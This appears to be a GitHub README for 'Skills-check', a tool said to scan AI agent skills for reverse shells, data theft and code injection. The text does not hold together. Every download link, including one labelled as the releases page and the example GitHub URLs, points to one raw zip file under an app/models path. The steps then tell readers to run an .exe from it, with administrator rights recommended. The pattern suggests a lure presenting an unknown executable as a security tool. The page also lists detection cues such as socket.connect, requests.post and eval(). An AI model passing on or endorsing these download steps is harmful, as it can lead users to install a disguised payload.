# 🛡️ Skills-check - Easy AI Skill Security Test

[![Download Skills-check](https://img.shields.io/badge/Download-Skills--check-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip)

---

## 📋 What is Skills-check?

Skills-check is a tool that helps you check AI Agent skills or plugins for security risks. It looks at the code behind these skills and spots any unsafe parts. This helps prevent possible problems before you use the skills.

The tool runs three levels of tests:

- **Static Analysis:** Quickly scans the code to find risky patterns without running it.
- **LLM Analysis:** Uses smart AI to understand complex threats like hidden bad code or traps.
- **Sandbox Analysis:** Runs the skill in a safe, limited space to see how it behaves.

You can check skills by pasting the code, uploading files, or giving the tool instructions to fetch the code automatically. This way, you avoid accidental risks in the AI skills you want to add.

---

## 🛠️ Features

### Three-layer Security Analysis

| Layer             | Technology         | Description                                 |
|-------------------|--------------------|---------------------------------------------|
| **Static Analysis** | Python AST         | Scans code structure for dangerous signs.  |
| **LLM Analysis**    | Qwen 3.5 Plus      | Deep review for tricky or harmful code.     |
| **Sandbox Analysis**| Docker Container   | Runs code safely to watch for bad actions.  |

### Two Ways to Check Skills

| Mode           | How to Use                              |
|----------------|---------------------------------------|
| **📝 Code Input** | Paste code, drag & drop files, or enter a GitHub URL. |
| **📦 Install Command** | Enter commands like `pip install` or GitHub repo links to fetch and analyze code. |

### Supported Install Commands Examples

Use these commands to ask Skills-check to get and check code automatically:

```
/plugin install example-skill+@agent-skills
/plugin add username/skills
/plugin add /path/to/skill-folder

# Direct GitHub URLs (repos, folders, or files)
https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip
https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip

# GitHub shortcuts
username/skills

# Package managers
pip install your-package
npm install your-package
```

---

## 🚩 What Risks Does Skills-check Look For?

Skills-check watches out for common dangerous actions in AI skills, such as:

- **Reverse Shell Access:** Looks for code that might open back doors or network connections like `socket.connect` or risky shell commands.
- **Data Theft:** Checks if the skill reads secret info or sends data out using commands like `requests.post`.
- **Code Injection:** Finds code that runs other code inside it, such as `eval()` or `exec()`, which may allow harmful payloads.

---

## 💻 System Requirements

- Windows 10 or later (64-bit preferred)
- At least 4 GB RAM
- Internet connection (for downloading and optional analysis)
- Docker (optional, for full sandbox testing; Skills-check works without it but with fewer features)
- Administrator rights recommended for installation

---

## 🚀 Getting Started

### Step 1: Download Skills-check

Click the big green button at the top or use this link to visit the download page:

[Download Skills-check releases](https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip)

The releases page has the latest version of Skills-check ready for Windows. Find the `.exe` file and download it.

---

### Step 2: Install Skills-check

1. After downloading, open the `.exe` file.
2. Follow the setup prompts. Agree to the license and choose an install folder or use the default.
3. Wait for the installation to complete.
4. Once done, Skills-check will be ready to use.

---

### Step 3: Run Skills-check

1. Open Skills-check from your Start menu or desktop shortcut.
2. You will see two options to start testing AI skills:

- **Paste code or URL:** Paste your skill code, drop files, or enter a GitHub URL.
- **Enter install command:** Type commands like `/plugin install` or package commands to fetch the skill for testing.

3. Click “Start Analysis” to begin the security check.
4. Wait a few moments while Skills-check runs all tests.

---

## 📥 How to Use Skills-check Safely

- Always download Skills-check from the official GitHub release page.
- Keep Skills-check updated to get the latest security rules.
- If you use Docker, make sure it is installed and running for the sandbox feature.
- Do not run untrusted AI skills before scanning them with Skills-check.

---

## 🔍 Understanding Scan Results

Skills-check will show you clear results, highlighting any risks found:

- **Red flags** mean serious problems, like backdoors or code injection.
- **Orange warnings** mean possible risks to check further.
- **Green means safe** or no major risks found.

You can review details on where the risk is found and what it might do. Use this to decide if the skill is safe to install.

---

## 📫 Support and Help

If you have trouble installing or running Skills-check:

- Check the README for guides and tips.
- Look for issues or help on the GitHub page.
- Ask someone knowledgeable about your system if needed.

---

[Download Skills-check releases](https://raw.githubusercontent.com/HutCh1E/Skills-check/master/app/models/check_Skills_towerwise.zip)